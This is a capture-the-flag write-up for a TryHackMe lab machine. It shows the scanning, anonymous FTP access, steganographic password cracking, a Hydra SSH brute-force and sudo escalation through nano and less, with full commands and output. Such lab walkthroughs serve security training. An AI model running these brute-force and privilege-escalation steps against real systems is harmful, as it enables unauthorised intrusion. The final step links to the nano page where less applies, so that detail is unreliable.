# Brooklyn Nine Nine
###### tags: `THM` `OSCP`

This is an easy room with 2 equally fun paths to exploit. Steganography or Brute-forcing, Holt or Peralta. Then use GTFO bins to get the root.

## 1. Scanning & Enumeration
### 1.1. Port Scanning
```
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.8.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Anonymous login shows us an interesting file: `note_to_jake.txt`.

Also running a full port scan, we get no additional information.
```
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### 1.2 Web Exploration
![Brooklyn Nine Nine Homepage image](https://i.imgur.com/6XcDCc8.jpg)

In the sourcecode, we see the following line: `<!-- Have you ever heard of steganography? -->`.

### 1.3 FTP 
So one thing we found was Anonymous login in FTP. Let's get the interesting file.
```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.150.90
Connected to 10.10.150.90.
220 (vsFTPd 3.0.3)
Name (10.10.150.90:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (391.2826 kB/s)
ftp> 
221 Goodbye.
```

Given that we have no other special pages, or any other ports - we have one option to bruteforce SSH.
```
┌──(kali㉿kali)-[/tmp]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
This is another pathway we can take.

### 1.4 Steganography
Let's get the image: `http://10.10.150.90/brooklyn99.jpg`.

Using steghide, to get the hidden file in the image - 
```
┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile brooklyn99.jpg 
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```

Okay. Let's get [StegSeek](https://github.com/RickdeJager/stegseek). It goes through the entire rockyou.txt in 2 seconds :)

Download the `.deb` file if you are on a debian based system, and install as shown below.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo dpkg --install stegseek_0.6-1.deb 
Selecting previously unselected package stegseek.
(Reading database ... 305959 files and directories currently installed.)
Preparing to unpack stegseek_0.6-1.deb ...
Unpacking stegseek (0.6-1) ...
Setting up stegseek (0.6-1) ...
```

Time to get in!

## 2. Foothold (Holt Path)
```
┌──(kali㉿kali)-[/tmp]
└─$ stegseek brooklyn99.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "*****"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

Voila! We get the passphrase, and the output file.

```
┌──(kali㉿kali)-[/tmp]
└─$ cat brooklyn99.jpg.out 
Holts Password:
{password}

Enjoy!!
```

Logging in,

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh holt@10.10.150.90  
The authenticity of host '10.10.150.90 (10.10.150.90)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.150.90' (ECDSA) to the list of known hosts.
holt@10.10.150.90's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ 
```

We are in!

## 3. PrivEsc (Holt Path)
Time to get the root. One very very good starting point is checking sudo permissions.
```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```


Use [GTFO bins](https://gtfobins.github.io/gtfobins/nano/#sudo). Too easy!

## 4. Foothold (Jake Path)
Let's also explore the other path hinted in the room. As I mentioned above, we can bruteforce SSH using Hydra.
```
┌──(kali㉿kali)-[/tmp]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.150.90 -t 4   
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-30 23:30:06
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.150.90:22/
[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
[22][ssh] host: 10.10.150.90   login: jake   password: {password}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-30 23:32:45
```

Logging in,

```
┌──(kali㉿kali)-[~]
└─$ ssh jake@10.10.150.90
jake@10.10.150.90's password: 
Last login: Mon May 31 03:59:08 2021 from 10.17.8.184
jake@brookly_nine_nine:~$ ls
```

We do not have any flag here. What we need is root permissions, so that we have it all.

## 5. PrivEsc (Jake Path)
```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ /usr/bin/less /root/root.txt
jake@brookly_nine_nine:~$ 
```

Use [GTFO bins](https://gtfobins.github.io/gtfobins/nano/#sudo).

System FULLY Compromised!
